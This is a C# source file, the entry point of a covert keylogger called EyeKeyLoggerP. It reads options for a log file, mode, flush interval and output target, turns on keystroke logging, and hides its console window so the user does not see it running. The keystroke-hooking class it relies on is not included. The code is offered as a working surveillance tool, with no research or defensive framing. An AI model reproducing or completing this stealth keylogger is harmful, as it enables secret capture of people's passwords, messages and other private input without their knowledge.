
using System;
using System.Reflection;
using System.Runtime.InteropServices;

namespace EyeKeyLoggerP
{
	class MainApp
	{
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("Kernel32")]
        private static extern IntPtr GetConsoleWindow();

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        [STAThread]
		static void Main(string[] args)
		{
			Assembly asmPath = System.Reflection.Assembly.GetExecutingAssembly();
			string exePath = asmPath.Location.Substring(0, asmPath.Location.LastIndexOf("\\"));

            EyeKeyLoggerP.Keylogger kl = new EyeKeyLoggerP.Keylogger();
			int fInterval = 0;
			string filename = "";
			string mode = "";
			string output = "";
            bool isServiceFlushing = false;
			if(args.Length > 0)
			{
				for(int x=0;x<args.Length;x++)
				{
					switch(args[x])
					{
						case "-f":
							filename = args[x+1];
							break;
						case "-m":
							mode = args[x+1];
							break;
						case "-i":
							fInterval = Convert.ToInt32(args[x+1]);
							break;
						case "-o":
							output = args[x+1];
							break;
					}
				}
			}
            
			// No args have been given, set defaults. 
			if(filename == "")
				filename = "EyeUserLog";
			if(mode == "")
				mode = "day";
			if(fInterval == 0)
				fInterval = 1000 * 60 * 1; // Default: 1 Minutes
			if(output == "")
				output = "service";

            if (output == "service")
                kl.SERVICE = true;

			kl.LOG_OUT = output;
			kl.LOG_MODE = mode;
			kl.LOG_FILE = exePath + "\\" + filename;
            
            ///// temp
            kl.Enabled = true; // enable key logging

            kl.FlushInterval = fInterval; // set buffer flush interval

            // hide console window - do not remove!!!
            IntPtr hwnd;
            hwnd = GetConsoleWindow();
            ShowWindow(hwnd, SW_HIDE);
            Console.ReadLine();
        }
    }
}
